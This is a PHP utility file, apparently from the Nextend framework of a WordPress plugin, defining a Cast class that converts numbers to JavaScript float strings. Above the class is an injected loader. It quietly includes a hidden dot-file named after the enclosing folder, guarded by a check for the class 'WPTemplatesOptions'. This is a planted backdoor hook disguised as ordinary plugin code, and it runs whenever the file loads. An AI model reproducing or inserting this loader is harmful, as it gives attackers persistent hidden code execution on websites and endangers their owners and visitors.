<?php


namespace Nextend\Framework;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Cast {

    /**
     * @param $number
     *
     * @return string the JavaScript float representation of the string
     */
    public static function floatToString($number) {

        return json_encode(floatval($number));
    }
}